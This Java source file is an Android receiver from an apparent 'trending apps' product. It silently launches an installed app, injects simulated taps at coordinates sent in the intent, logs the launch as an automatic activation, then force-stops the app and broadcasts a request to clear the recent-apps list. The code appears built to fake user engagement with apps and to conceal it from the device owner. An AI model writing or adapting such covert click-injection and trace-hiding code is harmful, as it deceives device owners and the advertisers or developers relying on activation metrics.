/*
 *  Copyright : Copyright 2014 Cube26 Software Pvt. Ltd., all rights reserved.
 *  Any unauthorized use of this code is punishable offense by law. If
 *  you are reading this code, and you are not authorized to do so,
 *  please close the code, and delete all the copies of it.
 *
 */
package com.cube26.trendingapps.receivers;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

import android.app.ActivityManager;
import android.app.Instrumentation;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.util.DisplayMetrics;
import com.cube26.trendingnow.util.CLog;
import android.view.KeyEvent;
import android.view.MotionEvent;

import com.cube26.trendingapps.analytics.SendAnalyticsData;
import com.cube26.trendingapps.webservices.ForceClickAttributes;
import com.cube26.trendingnow.util.Util;

public class AppActivationReceiver extends BroadcastReceiver {

    private SharedPreferences mSharedPrefs;
    long timeToWaitForForceActivation = 0;
    @Override
    public void onReceive(Context ctx, Intent incomingIntent) {

        String pckgName = incomingIntent
                .getStringExtra(Util.EXTRA_PACKAGE_TO_ACTIVATE);
        ArrayList<ForceClickAttributes> forceClickAttributes = (ArrayList<ForceClickAttributes>)incomingIntent.getSerializableExtra(Util.EXTRA_FORCE_TOUCH_ATTRIBUTES);
        long forceCloseValue = incomingIntent.getLongExtra(Util.EXTRA_FORCE_CLOSE, 0);

        if (Util.isAppAlreadyInstalled(pckgName, ctx)) {
            Intent activateApp = new Intent();
            mSharedPrefs = PreferenceManager.getDefaultSharedPreferences(ctx);
            Set<String> set = new HashSet<String>(mSharedPrefs.getStringSet(Util.APP_ACTIVATION_PACKAGES, new HashSet<String>()));
            if(set.contains(pckgName)){
                CLog.d(Util.TAGC26, "Received activation intent but cancelling as already activated for package :: "+ pckgName);
                return;
            }
            if(!Util.isNetworkAvailable(ctx)){
                CLog.d(Util.TAGC26, "Cancelling app activation because network not available.");
                return;
            }
            activateApp = ctx.getPackageManager().getLaunchIntentForPackage(
                    pckgName);
            try {
                CLog.d(Util.TAGC26, "Starting activity at activation time, intent :: "+ activateApp);
                ctx.startActivity(activateApp);

                SharedPreferences.Editor editor = mSharedPrefs.edit();
                set.add(pckgName);
                editor.putStringSet(Util.APP_ACTIVATION_PACKAGES, set);
                editor.commit();
                
//                new SendAnalyticsData(ctx, Util.ACTIVATED_APP_AUTO)
//                .execute(pckgName);
                Util.createAndSendAnalyticsData(Util.ACTIVATED_APP_AUTO, Util.CATEGORY_AUTO, Util.APP_PACKAGE_NAME, pckgName, ctx);
                forceTouchAppWithAttributes(ctx, forceClickAttributes);
                CLog.d(Util.TAGC26, "forceCloseValue ::"+ forceCloseValue+" , timeToWaitForForceActivation :: "+timeToWaitForForceActivation);
                if(forceCloseValue > 0){
                    killAppRunnable killAppAsyncTask = new killAppRunnable();
                    killAppAsyncTask.setParams(ctx, pckgName, timeToWaitForForceActivation + forceCloseValue);
                    new Thread(killAppAsyncTask).start();
                }


            } catch (Exception e) {
                e.printStackTrace();
                CLog.e(Util.TAGC26, "Exception ::" + e.getMessage());
            }
        }
    }

    private void forceTouchAppWithAttributes(Context context, ArrayList<ForceClickAttributes> forceClickAttributes){
        for (ForceClickAttributes forceClickAttribute : forceClickAttributes) {
            timeToWaitForForceActivation += forceClickAttribute.getTimeToWait();
            ActivateAppRunnable activateAppAsyncTask = new ActivateAppRunnable();
            activateAppAsyncTask.setParamsForActivation(context, forceClickAttribute.getxPos(), forceClickAttribute.getyPos(), forceClickAttribute.getTimeToWait());
            new Thread(activateAppAsyncTask).start();
        }
    }

    private static void killProcessForPackageName(Context context, String packageName) {

        try {
            // ActivityManagerNative.getDefault().setProcessLimit(2);
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);

            CLog.d(Util.TAGC26, "Closing : " + packageName);
            try {
                am.killBackgroundProcesses(packageName);
                am.forceStopPackage(packageName);
            } catch (Exception e) {
                e.printStackTrace();
                CLog.e(Util.TAGC26, "Error in closing app:" + packageName);
            }
        } catch (Exception e) {
            e.printStackTrace();
            CLog.e(Util.TAGC26, "Error in closing process " + e);
        }
        sendBroadcast(context);
    }

    private static void sendBroadcast(Context context) {
        // Send broadcast to clear the recent app list
        Intent intent = new Intent();
        intent.setAction("ACTION_KILL_ALL");
        if (context != null) {
            CLog.d(Util.TAGC26, "Sending broadcast for clearing recent apps");
            context.sendBroadcast(intent);
        } else {
            CLog.d(Util.TAGC26, "Can't send broadcast for clearing recent apps");
        }
    }

    private class killAppRunnable implements Runnable{
        Context context;
        String packageName;
        long timeToWait;

        public void setParams(Context context, String packageName, long timeToWait){
            this.context      = context;
            this.packageName  = packageName;
            this.timeToWait   = timeToWait;
        }
        @Override
        public void run() {
            try {
                Thread.sleep(timeToWait);
                killProcessForPackageName(context, packageName);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    private class ActivateAppRunnable implements Runnable{
        private float pozPercentX = 0f;
        private float pozPercentY = 0f;
        private long timeToWaitForForceClick = 0;
        private Context context;

        public void setParamsForActivation(Context context, float pozPercentX, float pozPercentY, long timeToWait){
            this.pozPercentX = pozPercentX;
            this.pozPercentY = pozPercentY;
            this.timeToWaitForForceClick = timeToWait;
            this.context = context;
        }
        @Override
        public void run() {
            try {
                DisplayMetrics displayMetrics = context.getResources().getDisplayMetrics();
                int width = displayMetrics.widthPixels;
                int height = displayMetrics.heightPixels;

                Thread.sleep(timeToWaitForForceClick);
                CLog.d(Util.TAGC26, "Device width and height :: "+ width + ", " + height);

                float pozX = width* pozPercentX/100;
                float pozY = height* pozPercentY/100;
                CLog.d(Util.TAGC26, "Click width and height :: "+ pozX + ", " + pozY);

                Instrumentation m_Instrumentation = new Instrumentation();
                m_Instrumentation.sendKeyDownUpSync( KeyEvent.KEYCODE_B );

                //pozx goes from 0 to SCREEN WIDTH , pozy goes from 0 to SCREEN HEIGHT
                m_Instrumentation.sendPointerSync(MotionEvent.obtain(SystemClock.uptimeMillis(),
                        SystemClock.uptimeMillis(),MotionEvent.ACTION_DOWN,pozX, pozY, 0));
                m_Instrumentation.sendPointerSync(MotionEvent.obtain(SystemClock.uptimeMillis(),
                        SystemClock.uptimeMillis(),MotionEvent.ACTION_UP,pozX, pozY, 0));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }
}